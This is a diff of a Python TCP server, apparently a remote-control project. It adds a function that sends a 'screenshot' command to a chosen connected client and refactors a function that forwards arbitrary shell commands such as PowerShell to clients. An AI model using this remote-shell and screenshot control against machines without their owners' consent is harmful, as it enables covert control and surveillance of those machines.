@@ -19,7 +19,7 @@ class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
 
     def setup(self) :
         print(f'\nNew client connection : {self.client_address}')
-        connected_clients[self.client_address] = self.request
+        connected_clients[self.client_address] = self.request # socket
         # print(f'Threads alive : {threading.active_count()}') # Debug purpose
 
     def handle(self):
@@ -102,48 +102,52 @@ def print_clients():
         print('Clients : ')
         for client in connected_clients:
             print(f'{client[0]}@{client[1]}')
-        
 
-# Verify that the socket is not closed, share the method from client
-def send_echo(msg: str):
+
+# REFACTOR : Verify that the socket is not closed, share the method from client
+def get_client(msg: str):
+    """ Return socket.socket object """
+
     client_ip, client_port = msg.split(' ')[1].split("@")
     client_port = int(client_port)
-    echo_msg = msg.split('\"')[1].replace('\"', "")
     # print(f'Client : {client_ip} @ {client_port} and msg : {echo_msg}')
 
     for client in connected_clients:
         if client[0] == client_ip and client[1] == client_port:
-            client_socket = connected_clients.get(client)
-            command = f"echo {echo_msg}"
-            print(f'echo {echo_msg} sent')
-            client_socket.sendall(command.encode('utf-8'))
-        else :
-            print(f'Client {client_ip}@{client_port} is not is the list of connected client')
+            return connected_clients.get(client)
+    
+    print(f'Client {client_ip}@{client_port} is not is the list of connected client')
+    return None
 
 
-def get_SC(client):
-    pass
+def send_echo(msg: str) :
+    client_socket = get_client(msg)
+    echo_msg = msg.split('\"')[1].replace('\"', "")
 
-# Replacing the send_echo test
-# Do some verification on the user input
-# PRINT EXEMPLES
-# shell 127.0.0.1@57693 powershell ls -n
+    command = f"echo {echo_msg}"
+    print(f'echo {echo_msg} sent')
+    client_socket.sendall(command.encode('utf-8'))
+
+
+def get_SC(msg: str):
+    client_socket = get_client(msg)
+
+    if client_socket:
+        command = 'screenshot'
+        client_socket.sendall(command.encode('utf-8'))
+
+
+# Add more examples
+# REFACTOR Do some verification on the user input
 def send_shell(msg: str):
-    client_ip, client_port = msg.split(' ')[1].split("@")
-    client_port = int(client_port)
+    """ Usage : shell 127.0.0.1@57693 powershell ls -n"""
+
+    client_socket = get_client(msg)
     command = re.split('@\d+ ', msg)[1] # Do some join if there's more than 1 @
+    print(f'Command : {command} sent')
 
-    for client in connected_clients:
-        if client[0] == client_ip and client[1] == client_port:
-            client_socket = connected_clients.get(client)
-            print(f'Command : {command} sent')
-
-            client_socket.sendall(command.encode('utf-8')) 
-            # The Data back should be caught by the open loop Handler
-
-        else :
-            print(f'Client {client_ip}@{client_port} is not is the list of connected client')
-
+    client_socket.sendall(command.encode('utf-8')) 
+    # The Data back is caught by the open loop Handler
 
 
 
